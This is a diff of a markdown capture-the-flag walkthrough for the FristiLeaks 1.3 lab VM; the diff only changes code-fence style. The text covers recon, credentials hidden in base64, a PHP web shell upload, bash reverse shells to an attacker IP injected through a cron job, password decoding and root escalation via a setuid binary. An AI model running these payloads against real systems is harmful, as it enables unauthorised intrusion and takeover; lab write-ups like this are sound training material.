@@ -10,18 +10,18 @@ This is a writeup for VulnHub's [FristiLeaks: 1.3](https://www.vulnhub.com/entry
 
 I don't think that we really need to cover this, as the IP address of the host is clearly written in the logon prompt after the virtual machine boots up. But here's how to find the IP address without looking at the VM's screen.
 
-```
+~~~
 $ arp -v
 
 Address                  HWtype  HWaddress           Flags Mask            Iface
 192.168.0.106            ether   08:00:27:a5:a6:76   C                     wlan0
 192.168.0.1              ether   c0:4a:00:65:77:d6   C                     wlan0
 Entries: 2  Skipped: 0  Found: 2
-```
+~~~
 
 Then, we can proceed to scanning for services.
 
-```
+~~~
 $ sudo nmap -T5 -A -v 192.168.0.106 -p 0-65535
 
 Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-28 21:29 WIB
@@ -75,7 +75,7 @@ Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 91.42 seconds
            Raw packets sent: 131104 (5.771MB) | Rcvd: 1481 (194.419KB)
-```
+~~~
 
 The host only has port 80 open.
 
@@ -91,12 +91,12 @@ If we check the page source, we can see that the image is located on `/images` d
 
 On the `robots.txt`, we can see three paths are disallowed.
 
-```
+~~~
 User-agent: *
 Disallow: /cola
 Disallow: /sisi
 Disallow: /beer
-```
+~~~
 
 Opening any of the disallowed paths will bring us to a page displaying Obi-Wan's image.
 
@@ -108,24 +108,24 @@ Since Nikto doesn't give me anything useful and all of the disallowed paths are 
 
 Check the source code of the page, notice that the developer left us a message.
 
-```html
+~~~html
 <!-- 
 TODO:
 We need to clean this up for production. I left some junk in here to make testing easier.
 
 - by eezeepz
 -->
-```
+~~~
 
 And the meta tag is a huge clue for us.
 
-```html
+~~~html
 <meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
-```
+~~~
 
 Under the Ha-Ha image's tag, there's another image encoded in base64 commented.
 
-```html
+~~~html
 <!-- 
 iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
 jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
@@ -150,11 +150,11 @@ AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
 CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
 U5ErkJggg==
 -->
-```
+~~~
 
 Save the login page as a HTML file. Remove the comment markers and add proper tags in their place.
 
-```html
+~~~html
 <center><img src="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
 jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
 S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
@@ -177,19 +177,19 @@ EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
 AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
 CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
 U5ErkJggg=="></center><br>
-```
+~~~
 
 Open the HTML file in a browser. We'll se an image displaying this string.
 
-```
+~~~
 keKkeKKeKKeKkEkkEk
-```
+~~~
 
 So this is our web login credentials.
 
-```
+~~~
 eezeepz:keKkeKKeKKeKkEkkEk
-```
+~~~
 
 ### File Uploader
 
@@ -197,13 +197,13 @@ After logging in, we'll find a file uploader. It claims to only accept `png`, `j
 
 I tried uploading a PHP file named `shell.php.jpg`. Here's the content of the file.
 
-```php
+~~~php
 <pre>
 <?php
   echo shell_exec($_GET['cmd']);
 ?>
 </pre>
-```
+~~~
 
 If I open `/fristi/uploads/shell.php.jpg`, it is displayed as a web page instead of an image. I can run shell commands from the `cmd` parameter. Running `whoami` will show us that we have the privilege of a user named apache.
 
@@ -213,7 +213,7 @@ I decided to upload [php-reverse-shell](http://pentestmonkey.net/tools/web-shell
 
 On `/home/eezeepz`, there's a file called `note.txt`.
 
-```
+~~~
 Yo EZ,
 
 I made it possible for you to do some automated checks, 
@@ -229,33 +229,33 @@ output goes to the file "cronresult" in /tmp/. It should
 run every minute with my account privileges.
 
 - Jerry
-```
+~~~
 
 So the good news is, we can put a command in a file named `runthis` in `/tmp` directory, and it will be run with privileges of a user called admin.
 
 I tried to this command in the `runthis` file.
 
-```bash
+~~~bash
 /bin/bash -i >& /dev/tcp/192.168.0.107/6666 0>&1
-```
+~~~
 
 But when it's run, the `cronresult` shows that it's not successful (my listener doesn't get any incoming connection too).
 
-```
+~~~
 command did not start with /home/admin or /usr/bin
-```
+~~~
 
 Well, Jerry did say that he only allow commands from /usr/bin/ or /home/admin/. So I tried this instead.
 
-```bash
+~~~bash
 /usr/bin/dir && /bin/bash -i >& /dev/tcp/192.168.0.107/6666 0>&1
-```
+~~~
 
 Start `netcat` to listen at port 6666.
 
-```
+~~~
 $ nc -lvp 6666
-```
+~~~
 
 Wait a minute for the connection, and we got the reverse shell.
 
@@ -265,24 +265,24 @@ So we got the access to `/home/admin` with the reverse shell from cron with Jerr
 
 #### 1. whoisyourgodnow.txt
 
-```
+~~~
 =RFn0AKnlMHMPIzpyuTI0ITG
-```
+~~~
 
 Seems like a reversed base64-encoded string.
 
 #### 2. cryptedpass.txt
 
-```
+~~~
 mVGZ3O3omkJLmy2pcuTq
-```
+~~~
 
 Seems like it's encrypted using the `cryptpass.py` script.
 
 
 #### 3. cryptpass.py
 
-```python
+~~~python
 #Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
 import base64,codecs,sys
 
@@ -292,7 +292,7 @@ def encodeString(str):
 
 cryptoResult=encodeString(sys.argv[1])
 print cryptoResult
-```
+~~~
 
 ### Decrypting the Passwords
 
@@ -300,51 +300,51 @@ It's pretty clear that the string in `cryptedpass.txt` is encrypted by using `cr
 
 Using the Python shell in my host, doing this will return the plaintext of the `cryptedpass.txt` file.
 
-```python
+~~~python
 import base64,codecs,sys
 
 ciphertext = 'mVGZ3O3omkJLmy2pcuTq'
 decoded_codecs = codecs.encode(ciphertext[::-1], 'rot13')
 plaintext = base64.b64decode(decoded_codecs)
 print plaintext
-```
+~~~
 
 It returned a plaintext which happens to be the password for the user named admin (Jerry's user).
 
-```
+~~~
 thisisalsopw123
-```
+~~~
 
 And I tried to do the same for the crypted string in `whoisyourgodnow.txt`.
 
-```python
+~~~python
 import base64,codecs,sys
 
 ciphertext = '=RFn0AKnlMHMPIzpyuTI0ITG'
 decoded_codecs = codecs.encode(ciphertext[::-1], 'rot13')
 plaintext = base64.b64decode(decoded_codecs)
 print plaintext
-```
+~~~
 
 It returned this plaintext.
 
-```
+~~~
 LetThereBeFristi!
-```
+~~~
 
 I thought that it was the root's password because of the name of the file, but it doesn't seem to be it. But I checked the file once again and see that it belongs to the user fristigod. I can su to fristigod now.
 
 But before that, I must spawn a tty.
 
-```
+~~~
 $ python -c 'import pty;pty.spawn("/bin/bash")'
-```
+~~~
 
 ### Fristigod
 
 We started in `/var/fristigod` directory when switching user to fristigod.
 
-```
+~~~
 $ ls -alh
 
 total 16K
@@ -352,30 +352,30 @@ drwxr-x---   3 fristigod fristigod 4.0K Nov 25 05:55 .
 drwxr-xr-x. 19 root      root      4.0K Nov 19 01:41 ..
 -rw-------   1 fristigod fristigod  864 Nov 25 06:09 .bash_history
 drwxrwxr-x.  2 fristigod fristigod 4.0K Nov 25 05:53 .secret_admin_stuff
-```
+~~~
 
 That `.secret_admin_stuff` directory seems interesting. I changed the directory and checked what's inside.
 
-```
+~~~
 $ ls -alh
 
 total 16K
 drwxrwxr-x. 2 fristigod fristigod 4.0K Nov 25 05:53 .
 drwxr-x---  3 fristigod fristigod 4.0K Nov 25 05:55 ..
 -rwsr-sr-x  1 root      root      7.4K Nov 25 05:53 doCom
-```
+~~~
 
 An executable file owned by root and is able to be run with root's privilege. Perfect!
 
 But simply running `doCom` will give us this.
 
-```
+~~~
 Nice try, but wrong user ;)
-```
+~~~
 
 I tried checking the strings inside the executable.
 
-```
+~~~
 $ strings doCom
 
 /lib64/ld-linux-x86-64.so.2
@@ -397,13 +397,13 @@ t$(L
 |$0H
 Nice try, but wrong user ;)
 Usage: ./program_name terminal_command ...
-```
+~~~
 
 It doesn't seem to run any other program in the system that I can easily trick it to giving me root shell. But seems like it acts as a proxy to run shell commands as root for the right user.
 
 I tried using sudo with fristigod, and I found out that fristigod is a sudoer (but with a very limited permission).
 
-```
+~~~
 $ sudo -l -U fristigod
 
 Matching Defaults entries for fristigod on this host:
@@ -417,23 +417,23 @@ Matching Defaults entries for fristigod on this host:
 
 User fristigod may run the following commands on this host:
     (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
-```
+~~~
 
 The user fristigod is allowed to run `doCom` as fristi. Let's try that.
 
-```
+~~~
 $ sudo -u fristi ./doCom
-```
+~~~
 
 And we got the right response.
 
-```
+~~~
 Usage: ./program_name terminal_command ...
-```
+~~~
 
 Try checking our privilege when executing the command with `doCom`.
 
-```
+~~~
 $ sudo -u fristi ./doCom id
 
 uid=0(root) gid=100(users) groups=100(users),502(fristigod)
@@ -441,27 +441,27 @@ uid=0(root) gid=100(users) groups=100(users),502(fristigod)
 $ sudo -u fristi ./doCom whoami
 
 root
-```
+~~~
 
 ### Getting the Flag
 
 As root, we're able to access the `/root` directory and check its contents. And here's our flag file, stored in that directory.
 
-```
+~~~
 $ sudo -u fristi ./doCom ls /root
 
 fristileaks_secrets.txt
-```
+~~~
 
 Time to get our flag.
 
-```
+~~~
 $ sudo -u fristi ./doCom cat /root/fristileaks_secrets.txt
-```
+~~~
 
 And here's it is!
 
-```
+~~~
 Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
 
 I wonder if you beat it in the maximum 4 hours it's supposed to take!
@@ -473,12 +473,12 @@ Flag: Y0u_kn0w_y0u_l0ve_fr1st1
 
 
 
-```
+~~~
 
 By the way, I could just spawn a root shell with `doCom` instead of doing things one by one like that.
 
-```
+~~~
 $ sudo -u fristi ./doCom /bin/bash
-```
+~~~
 
 I wonder if I managed to finish it in 4 hours. I did it in three days, around one or two hours per day. But well, it's finished though.
